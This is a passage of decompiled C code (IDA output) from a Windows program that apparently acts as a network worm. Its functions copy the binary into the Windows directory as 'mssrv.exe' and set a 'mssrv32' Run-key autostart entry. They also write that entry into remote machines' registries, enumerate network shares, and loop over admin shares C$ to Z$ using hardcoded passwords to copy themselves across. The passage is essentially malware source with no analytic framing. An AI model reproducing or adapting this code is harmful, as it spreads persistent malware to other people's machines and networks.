  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
char byte_4134FF[257] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
LPCSTR lpPassword = "administator"; // idb
char byte_4159C7[] = { '\0' }; // weak
CHAR Password = '\0'; // idb
char byte_4159C9 = '\0'; // weak
int dword_4159D4 = -1; // weak
char aThisisapasswor[17] = "thisisapassword!"; // weak
int dword_4159EC = 500; // weak
int dword_4159F0 = 0; // weak
int dword_4159F4 = 1; // weak
int dword_4159F8 = 0; // weak
int dword_4159FC[9] = { 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
int dword_415A20 = 0; // weak
int dword_415A24 = 0; // weak
int dword_415A28 = 0; // weak
int dword_415A2C = 8; // weak
int dword_415A30 = 16; // weak
int dword_415A34 = 32; // weak
int dword_415A38 = 64; // weak
int dword_415A3C = 128; // weak
int dword_415A40 = 256; // weak
int dword_415A44 = 512; // weak
int dword_415A4C = 0; // weak
int dword_415A50 = 0; // weak
int dword_415A54 = 0; // weak
int dword_415A58 = 0; // weak
int dword_415A5C = 0; // weak
void *off_415A60 = &unk_4114D6; // weak
void *off_415A64 = &unk_4116DA; // weak
int dword_415A68 = 0; // weak
int funcs_404BE0[80] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
int dword_415BAC = 80; // weak
int dword_415BB0 = 0; // weak
int dword_415BB4 = 0; // weak
int dword_415BB8 = 0; // weak
int dword_415BC0 = 0; // weak
LPCVOID lpAddress = NULL; // idb
SIZE_T dwSize = 0u; // idb
int dword_415BD0 = 1024; // weak
_DWORD dword_415BD4[44] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
int dword_415C84 = 0; // weak
char *off_415CDC[17] =
{
  ":AM:PM",
  ":Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday",
  ":Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday",
  ":Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday",
  ":Jan:January:Feb:February:Mar:March:Apr:April:May:May:Jun:June:Jul:July:Aug:August:Sep:September:Oct:October:Nov:November:Dec:December",
  ":Jan:January:Feb:February:Mar:March:Apr:April:May:May:Jun:June:Jul:July:Aug:August:Sep:September:Oct:October:Nov:November:Dec:December",
  ":Jan:January:Feb:February:Mar:March:Apr:April:May:May:Jun:June:Jul:July:Aug:August:Sep:September:Oct:October:Nov:November:Dec:December",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p",
  "|%a %b %e %T %Y|%m/%d/%y|%H:%M:%S|%I:%M:%S %p"
}; // weak
void *off_415D28 = &unk_4119E9; // weak
void *off_415D2C = &unk_411A71; // weak
int dword_415D30 = 0; // weak
char byte_415D34[4] = { ':', 'E', 'S', 'T' }; // weak
char byte_415D38[5] = { ':', 'E', 'D', 'T', ':' }; // weak
char byte_415D3D = '-'; // weak
char byte_415D3E = '0'; // weak
char byte_415D3F = '5'; // weak
int dword_415D44 = 0; // weak
_UNKNOWN unk_415D48; // weak
_UNKNOWN unk_415E54; // weak
LPVOID off_415EA0 = &unk_415DBC; // idb
_DWORD dword_4162A0[4] = { 429065504, 0, 0, 0 }; // weak
void *off_4162B0 = &unk_411ACC; // weak
_UNKNOWN unk_4162B4; // weak
void *off_416304 = &unk_411ADA; // weak
int dword_416308 = 0; // weak
LPVOID dword_41630C = NULL; // idb
char byte_416310 = '\x03'; // weak
void *off_416394 = &unk_412176; // weak
void *off_4163D4 = &unk_412176; // weak
void *off_416440 = &unk_4124FD; // weak
double dbl_41644C = +Inf; // weak
// extern LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegConnectRegistryA)(LPCSTR lpMachineName, HKEY hKey, PHKEY phkResult);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern SC_LOCK (__stdcall *LockServiceDatabase)(SC_HANDLE hSCManager);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *ChangeServiceConfigA)(SC_HANDLE hService, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword, LPCSTR lpDisplayName);
// extern BOOL (__stdcall *StartServiceA)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *UnlockServiceDatabase)(SC_LOCK ScLock);
// extern BOOL (__stdcall *EnumServicesStatusA)(SC_HANDLE hSCManager, DWORD dwServiceType, DWORD dwServiceState, LPENUM_SERVICE_STATUSA lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned, LPDWORD lpResumeHandle);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern BOOL (__stdcall *DeleteService)(SC_HANDLE hService);
// extern HINSTANCE (__stdcall *FindExecutableA)(LPCSTR lpFile, LPCSTR lpDirectory, LPSTR lpResult);
// extern HINSTANCE (__stdcall *ShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern void (__stdcall *GetLocalTime)(LPSYSTEMTIME lpSystemTime);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern HANDLE (__stdcall *OpenMutexA)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName);
// extern BOOL (__stdcall *ReleaseMutex)(HANDLE hMutex);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern BOOL (__stdcall *SetConsoleCtrlHandler)(PHANDLER_ROUTINE HandlerRoutine, BOOL Add);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern SIZE_T (__stdcall *VirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// extern HANDLE (__stdcall *HeapCreate)(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern LPVOID (__stdcall *HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern SIZE_T (__stdcall *HeapSize)(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *DuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
// extern UINT (__stdcall *SetHandleCount)(UINT uNumber);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern LPCH (__stdcall *GetEnvironmentStrings)();
// extern BOOL (__stdcall *FreeEnvironmentStringsA)(LPCH penv);
// extern LONG (__stdcall *UnhandledExceptionFilter)(struct _EXCEPTION_POINTERS *ExceptionInfo);
// extern DWORD (__stdcall *GetTimeZoneInformation)(LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
// extern BOOL (__stdcall *SetStdHandle)(DWORD nStdHandle, HANDLE hHandle);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *SetEndOfFile)(HANDLE hFile);
// extern int (__stdcall *GetWindowTextA)(HWND hWnd, LPSTR lpString, int nMaxCount);
// extern DWORD (__stdcall *GetWindowThreadProcessId)(HWND hWnd, LPDWORD lpdwProcessId);
// extern BOOL (__stdcall *EnumWindows)(WNDENUMPROC lpEnumFunc, LPARAM lParam);
// extern SOCKET (__stdcall *socket)(int af, int type, int protocol);
// extern u_long (__stdcall *htonl)(u_long hostlong);
// extern u_short (__stdcall *htons)(u_short hostshort);
// extern int (__stdcall *bind)(SOCKET s, const struct sockaddr *name, int namelen);
// extern int (__stdcall *recvfrom)(SOCKET s, char *buf, int len, int flags, struct sockaddr *from, int *fromlen);
// extern int (__stdcall *sendto)(SOCKET s, const char *buf, int len, int flags, const struct sockaddr *to, int tolen);
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern int (__stdcall *WSACleanup)();
int dword_416E7C[31] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
int dword_416EF8 = 0; // weak
int dword_416EFC = 0; // weak
int dword_416F00 = 0; // weak
HANDLE hHeap = NULL; // idb
struct _FILETIME SystemTimeAsFileTime = { 0u, 0u }; // idb
char byte_416F2C[40] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
struct _WIN32_FIND_DATAA FindFileData =
{
  0u,
  { 0u, 0u },
  { 0u, 0u },
  { 0u, 0u },
  0u,
  0u,
  0u,
  0u,
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFFX\xC2\x0E",
  {  }
}; // idb
_UNKNOWN unk_417094; // weak
int dword_4170B4; // weak
UINT uNumber; // idb
LPVOID lpMem; // idb


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  int result; // eax

  *a1 = (__int16)(sub_403680() % 255 + 1);
  *a2 = (__int16)(sub_403680() % 255 + 1);
  *a3 = (__int16)(sub_403680() % 255 + 1);
  result = (__int16)(sub_403680() % 255 + 1);
  *a4 = result;
  return result;
}

//----- (00401080) --------------------------------------------------------
UINT __cdecl sub_401080(void *a1)
{
  int i; // ebx
  UINT result; // eax
  _DWORD v3[26]; // [esp-6Ch] [ebp-70h] BYREF
  char v4[7]; // [esp-3h] [ebp-7h] BYREF

  strcpy(v4, "_:");
  for ( i = 0; i < 26; ++i )
  {
    v4[0] = i + 65;
    result = GetDriveTypeA(v4);
    v3[i] = result;
  }
  qmemcpy(a1, v3, 0x68u);
  return result;
}

//----- (004010D0) --------------------------------------------------------
int sub_4010D0()
{
  unsigned int v0; // kr00_4
  int result; // eax
  CHAR ValueName[8]; // [esp+8h] [ebp-21Ch] BYREF
  DWORD cbData; // [esp+10h] [ebp-214h] BYREF
  HKEY phkResult; // [esp+14h] [ebp-210h] BYREF
  CHAR Directory; // [esp+1Bh] [ebp-209h] BYREF
  CHAR File[10]; // [esp+1Ch] [ebp-208h] BYREF
  CHAR v7[255]; // [esp+26h] [ebp-1FEh] BYREF
  BYTE Data[255]; // [esp+125h] [ebp-FFh] BYREF

  qmemcpy(v7, &unk_40C003, sizeof(v7));
  qmemcpy(Data, &unk_40C102, sizeof(Data));
  cbData = 255;
  strcpy(File, "mssrv.exe");
  qmemcpy(&Directory, &unk_40C20B, sizeof(Directory));
  strcpy(ValueName, "mssrv32");
  if ( (unsigned int)FindExecutableA(File, &Directory, v7) <= 0x20
    || RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 1u, &phkResult)
    || RegQueryValueExA(phkResult, ValueName, 0, 0, Data, &cbData)
    || sub_403730(Data, (unsigned __int8 *)v7, 10) )
  {
    RegCloseKey(phkResult);
    return 0;
  }
  else
  {
    RegCloseKey(phkResult);
    v0 = __readeflags();
    result = 1;
    __writeeflags(v0);
  }
  return result;
}

//----- (00401200) --------------------------------------------------------
int __cdecl sub_401200(BYTE *lpData, DWORD cbData)
{
  CHAR ValueName[8]; // [esp+Ah] [ebp-3Ah] BYREF
  CHAR SubKey[46]; // [esp+12h] [ebp-32h] BYREF
  HKEY v5; // [esp+40h] [ebp-4h] BYREF

  strcpy(SubKey, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
  strcpy(ValueName, "mssrv32");
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 2u, &v5) )
  {
    if ( !RegSetValueExA(v5, ValueName, 0, 1u, lpData, cbData) )
    {
      RegCloseKey(v5);
      return 0;
    }
    RegCloseKey(v5);
  }
  return 1;
}

//----- (00401290) --------------------------------------------------------
int __cdecl sub_401290(BYTE *lpData, DWORD cbData, LPCSTR lpMachineName)
{
  CHAR ValueName[8]; // [esp+Ah] [ebp-3Eh] BYREF
  CHAR SubKey[46]; // [esp+12h] [ebp-36h] BYREF
  HKEY v6; // [esp+40h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+44h] [ebp-4h] BYREF

  strcpy(SubKey, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
  strcpy(ValueName, "mssrv32");
  if ( RegConnectRegistryA(lpMachineName, HKEY_LOCAL_MACHINE, &phkResult) )
  {
    RegCloseKey(phkResult);
  }
  else if ( !RegOpenKeyExA(phkResult, SubKey, 0, 2u, &v6) && !RegSetValueExA(v6, ValueName, 0, 1u, lpData, cbData) )
  {
    RegCloseKey(phkResult);
    RegCloseKey(v6);
    return 0;
  }
  RegCloseKey(v6);
  return 1;
}

//----- (00401340) --------------------------------------------------------
int __cdecl sub_401340(const CHAR *a1)
{
  int result; // eax
  char v2[259]; // [esp-FFh] [ebp-103h] BYREF

  result = sub_4010D0();
  if ( result != 1 )
  {
    GetWindowsDirectoryA(v2, 0xFFu);
    sub_403780(v2, "\\mssrv.exe");
    result = sub_401D90(a1, v2);
    if ( !result )
      return sub_401200((BYTE *)v2, 0xFFu);
  }
  return result;
}

//----- (004013B0) --------------------------------------------------------
int __cdecl sub_4013B0(BYTE *a1, char *a2, const CHAR *a3, const CHAR *a4)
{
  int v4; // ebx
  char *v5; // edx
  char *v6; // ecx
  char v7; // al
  char v9[255]; // [esp-391h] [ebp-395h] BYREF
  char v10[255]; // [esp-292h] [ebp-296h] BYREF
  char v11[255]; // [esp-193h] [ebp-197h] BYREF
  struct _NETRESOURCEA v12; // [esp-94h] [ebp-98h] BYREF
  _BYTE v13[120]; // [esp-74h] [ebp-78h] BYREF

  v4 = 0;
  qmemcpy(v13, off_40C280, 0x74u);
  strcpy(v11, a2);
  strcpy(v10, a2);
  sub_401CF0((unsigned int)v10, v10);
  v12.dwScope = 2;
  v12.dwType = 1;
  v12.dwDisplayType = 3;
  v12.dwUsage = 1;
  v12.lpLocalName = 0;
  v12.lpRemoteName = v11;
  v12.lpComment = 0;
  v12.lpProvider = 0;
  WNetAddConnection2A(&v12, a4, a3, 0);
  while ( *(_DWORD *)&v13[4 * v4] )
    ++v4;
  v5 = *(char **)&v13[4 * sub_401C90(0, v4)];
  v6 = (char *)(v9 - v5);
  do
  {
    v7 = *v5;
    v5[(_DWORD)v6] = *v5;
    ++v5;
  }
  while ( v7 );
  sub_403780(a2, "\\");
  sub_403780(a2, v9);
  if ( sub_401D90((const CHAR *)a1, a2) )
  {
    WNetCancelConnection2A(v11, 1u, 1);
    return 1;
  }
  else
  {
    sub_401290(a1, 4u, v10);
    WNetCancelConnection2A(v11, 1u, 1);
    return 0;
  }
}
// 40C280: using guessed type char *off_40C280[28];

//----- (00401530) --------------------------------------------------------
char *__cdecl sub_401530(char *a1)
{
  DWORD nSize; // [esp+4h] [ebp-104h] BYREF
  CHAR Buffer[255]; // [esp+9h] [ebp-FFh] BYREF

  nSize = 255;
  GetComputerNameA(Buffer, &nSize);
  return sub_403780(strcpy(a1, "\\\\"), Buffer);
}

//----- (00401590) --------------------------------------------------------
int __cdecl sub_401590(BYTE *a1, const char *a2, const CHAR *a3, const CHAR *a4)
{
  int i; // esi
  int v5; // edi
  int result; // eax
  char v7[255]; // [esp+Dh] [ebp-FFh] BYREF

  for ( i = 0; i < 24; ++i )
  {
    strcpy(v7, a2);
    sub_403780(v7, "\\");
    v5 = 0;
    while ( v7[v5] )
    {
      if ( ++v5 >= 255 )
        goto LABEL_6;
    }
    v7[v5] = i + 67;
    v7[v5 + 1] = 36;
    v7[v5 + 2] = 0;
LABEL_6:
    result = sub_4013B0(a1, v7, a3, a4);
  }
  return result;
}
// 401590: using guessed type char var_FF[255];

//----- (00401640) --------------------------------------------------------
int __cdecl sub_401640(LPNETRESOURCEA lpNetResource, BYTE *a2)
{
  int LastError; // eax
  DWORD i; // ebx
  _BYTE *v5; // ecx
  char *v6; // edx
  int v7; // eax
  int v8; // eax
  char *v9; // edx
  char *v10; // ecx
  char v11; // al
  LPVOID v12; // [esp+10h] [ebp-22Ch]
  CHAR v13[13]; // [esp+17h] [ebp-225h] BYREF
  LPCSTR lpUserName; // [esp+24h] [ebp-218h] BYREF
  HANDLE hEnum; // [esp+28h] [ebp-214h] BYREF
  DWORD BufferSize; // [esp+2Ch] [ebp-210h] BYREF
  char v17[255]; // [esp+31h] [ebp-20Bh] BYREF
  DWORD v18; // [esp+130h] [ebp-10Ch]
  char v19[255]; // [esp+135h] [ebp-107h] BYREF
  DWORD cCount; // [esp+234h] [ebp-8h] BYREF
  LPVOID lpBuffer; // [esp+238h] [ebp-4h]

  cCount = -1;
  lpBuffer = 0;
  strcpy((char *)&lpUserName, "+Ã@");
  sub_401530(v19);
  BufferSize = 1024;
  lpBuffer = sub_403DC0(0x400u);
  v12 = lpBuffer;
  memset(lpBuffer, 0, BufferSize);
  if ( !v12 )
    return -1;
  v18 = WNetOpenEnumA(2u, 0, 0, lpNetResource, &hEnum);
  while ( 1 )
  {
    v18 = WNetEnumResourceA(hEnum, &cCount, lpBuffer, &BufferSize);
    if ( v18 == 234 )
      lpBuffer = sub_4041B0((char *)lpBuffer, BufferSize);
    if ( v18 )
      break;
    for ( i = 0; i < cCount; ++i )
    {
      v5 = (_BYTE *)*((_DWORD *)lpBuffer + 8 * i + 5);
      v6 = v19;
      HIWORD(v7) = 0;
      while ( 1 )
      {
